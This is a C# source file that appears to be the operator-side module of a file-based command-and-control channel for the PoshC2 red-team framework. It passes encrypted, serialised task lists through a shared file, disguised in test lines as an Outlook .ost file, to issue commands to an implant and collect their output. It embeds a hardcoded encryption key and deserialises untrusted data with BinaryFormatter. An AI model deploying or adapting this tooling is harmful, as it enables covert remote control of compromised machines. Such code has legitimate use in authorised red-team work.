using System;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Security.Principal;
using System.Threading;
using System.Runtime.Serialization;
using System.Security;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;

namespace FComm
{
    [Serializable()]
    public class RHDataGram : ISerializable
    {
        public string PacketType { get; set; }
        public string Input { get; set; }
        public string Output { get; set; }
        public DateTime UpdateTime { get; set; }
        public bool Sent { get; set; }
        public bool Actioned { get; set; }
        public bool Retrieved { get; set; }

        public RHDataGram()
        {
            UpdateTime = DateTime.Now;
            Sent = false;
            Actioned = false;
            Retrieved = false;
        }

        public override string ToString()
        {
            return string.Format("Packet of type {0}, contained the input {1} and was constructed at {2}.\n Complete State is: {3} and Retrieved state is: {4}.\n Result is: {5}", PacketType, Input, UpdateTime, Sent, Retrieved, Output);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("packetType", PacketType);
            info.AddValue("input", Input);
            info.AddValue("output", Output);
            info.AddValue("sent", Sent);
            info.AddValue("retrieved", Retrieved);
            info.AddValue("actioned", Actioned);
            info.AddValue("updateTime", UpdateTime);
        }

        public RHDataGram(SerializationInfo info, StreamingContext context)
        {
            PacketType = (string)info.GetValue("packetType", typeof(string));
            Input = (string)info.GetValue("input", typeof(string));
            Output = (string)info.GetValue("output", typeof(string));
            Sent = (bool)info.GetValue("sent", typeof(bool));
            Actioned = (bool)info.GetValue("actioned", typeof(bool));
            Retrieved = (bool)info.GetValue("retrieved", typeof(bool));
            UpdateTime = (DateTime)info.GetValue("updateTime", typeof(DateTime));
        }
    }


    public class RHServer
    {
        //Client is the far end of this connection.
        private string Filepath;
        public RHServer(string Filepath)
        {
            try
            {
                if (File.Exists(Filepath))
                {
                    this.Filepath = Filepath;
                }
            }
            catch (SecurityException e)
            {
                Debug.Print(e.Message);
            }
            catch (Exception e)
            {
                Debug.Print(e.Message);
            }
        }

        public string Receive()
        {
            //Noddy as
            return File.ReadAllText(this.Filepath);
        }
        public void Send(byte[] data)
        {
            //method to send dataGrams, not bytearrays.
            throw new NotImplementedException();
        }
        public void SendData(String DataToSend)
        {
            //Write bytearrays - Ugh. Entire thing passes massive base64 strings around.
            //Write strings.
            try
            {
                //intended to handle byte[]
                //FileStream FileToBeWritten = File.Open(this.filepath, FileMode.Open, FileAccess.Write);
                //FileToBeWritten.Write(toGo, 0, toGo.Length); //Write the bytearray to the file.
                //FileToBeWritten.Close();
                File.WriteAllText(this.Filepath, DataToSend);
            }
            catch (Exception e)
            {
                Debug.Print(e.Message);
            }
        }

        public RHDataGram SetTask(string task)
        {
            RHDataGram newTask = new RHDataGram();
            newTask.Input = task;
            return newTask;
        }

        public void CleanUp()
        {
            //maybe utilise POSH SHRED here?
            File.Delete(this.Filepath);
        }

    }

    public class Class1
    {
        private static string FilePath;
        private static string Encryptionkey = "";
        private static RHServer FComm;
        private static readonly object _lock = new object();

        public static void Main(string[] args)
        {
            //Start(args);
            /*Start(new string[] {"Start","c:\\users\\public\\test.ost","c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c="});
            
            Start(new string[] { "Start", "ATHOMPSON", "msukpipereader", "mtkn4", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            Start(new string[] { "foo" });
            Console.ReadLine();
            */
        }

        /// <summary>
        /// Just a function that main can wrap for testing. 
        /// </summary>
        public static void Start(string[] args)
        {
            bool Running = false;

            if (args.Length == 3 && args[0].ToLower() == "start") // If in format 'Start <filepath> <key>'
            {
                FilePath = args[1];
                Encryptionkey = args[2];
            }

            Console.WriteLine($"[+] Connecting to: {FilePath} with key {Encryptionkey}");
            FComm = new RHServer(FilePath); //create an object.
            Running = true;

            var command = $"{string.Join(" ", args)}";
            if (command.ToLower().StartsWith("kill"))
            {
                IssueCommand(command, FComm, Running);
                Running = false;
                //assume the kill command works - maybe need to remove the implant from poshc2?
            }
            else if (command.ToLower().StartsWith("start"))
            {
                IssueCommand(FComm);
            }
            else
            {
                IssueCommand(command, FComm, Running);
            }
        }

        /// <summary>
        /// Will issue the specified command to the pipe and read the response
        /// </summary>
		public static void IssueCommand(RHServer FComm)
        { //Overloaded method, just for init phase.
            lock (_lock)
            {
                try
                {
                    byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
                    Console.WriteLine("Bytes: " + DataToParseBytes.Length);
                    //Step 1: STREAM
                    MemoryStream stream = new MemoryStream(DataToParseBytes);
                    BinaryFormatter bf = new BinaryFormatter();
                    //Step 2: DESERIALIZE!
                    List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
                    Console.WriteLine(DataToParse.ToString());
                    stream.Dispose();
                    foreach (RHDataGram Task in DataToParse)
                    {
                        if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
                        {
                            Console.WriteLine("Init Received or something");
                            Console.WriteLine(Task.Output);
                            Task.Retrieved = true;
                            continue;
                        }
                    }
                    MemoryStream stream2 = new MemoryStream();
                    bf.Serialize(stream, DataToParse);
                    var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
                    stream.Dispose();
                    //Send the DATAAAAAAAAAHH!!!
                    FComm.SendData(DataToGo);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error in FComm Initialisation!!: {e.Message}");
                    Console.WriteLine($"[-] {e.StackTrace}");
                }
            }
        }
        public static void IssueCommand(string command, RHServer FComm, bool Running)
        {
            // Lock this so only one thread can read/write to the pipe at a time
            lock (_lock)
            {
                while (Running)
                {
                    Thread.Sleep(5000);
                    bool taskAdded = false;
                    try
                    {
                        //Get file contents
                        //decrypt the contents

                        byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
                        //Step 1: STREAM
                        MemoryStream stream = new MemoryStream(DataToParseBytes);
                        BinaryFormatter bf = new BinaryFormatter();
                        //Step 2: DESERIALIZE!
                        List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
                        stream.Dispose();

                        foreach (RHDataGram Task in DataToParse)
                        {
                            if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
                            {
                                Console.WriteLine(Task.Output);
                                Task.Retrieved = true;
                                continue;
                            }
                            if (Task.Actioned == true && Task.PacketType != "INIT") //It's output from a command!.
                            {
                                Console.WriteLine(Task.Output);
                                Task.Retrieved = true;
                                Running = false;
                            }
                            if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
                            {
                                DataToParse.Add(FComm.SetTask(command));
                                taskAdded = true;
                            }

                        }
                        MemoryStream stream2 = new MemoryStream();
                        bf.Serialize(stream, DataToParse);
                        var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
                        stream.Dispose();
                        //Send the DATAAAAAAAAAHH!!!
                        FComm.SendData(DataToGo);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error in FComm Command Loop: {e.Message}");
                        Console.WriteLine($"[-] {e.StackTrace}");
                    }
                }
            }
        }

        private static byte[] Decrypt(string key, string ciphertext)
        {
            var rawCipherText = Convert.FromBase64String(ciphertext);
            var IV = new Byte[16];
            Array.Copy(rawCipherText, IV, 16);
            try
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return decrypted.ToArray();
            }
            catch
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return decrypted.ToArray();
            }
            finally
            {
                Array.Clear(rawCipherText, 0, rawCipherText.Length);
                Array.Clear(IV, 0, 16);
            }
        }

        private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
        {
            byte[] byEnc;
            if (unByte != null)
                byEnc = unByte;
            else
                byEnc = Encoding.UTF8.GetBytes(un);

            if (comp)
                byEnc = GzipCompress(byEnc);

            try
            {
                var a = CreateEncryptionAlgorithm(key, null);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
            catch
            {
                var a = CreateEncryptionAlgorithm(key, null, false);
                var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
        }

        private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
        {
            SymmetricAlgorithm algorithm;
            if (rij)
                algorithm = new RijndaelManaged();
            else
                algorithm = new AesCryptoServiceProvider();

            algorithm.Mode = CipherMode.CBC;
            algorithm.Padding = PaddingMode.Zeros;
            algorithm.BlockSize = 128;
            algorithm.KeySize = 256;

            if (null != IV)
                algorithm.IV = Convert.FromBase64String(IV);
            else
                algorithm.GenerateIV();

            if (null != key)
                algorithm.Key = Convert.FromBase64String(key);

            return algorithm;
        }

        private static byte[] GzipCompress(byte[] raw)
        {
            using (MemoryStream memory = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }
                return memory.ToArray();
            }
        }

        private static byte[] CombineArrays(byte[] first, byte[] second)
        {
            byte[] ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }



    }
}

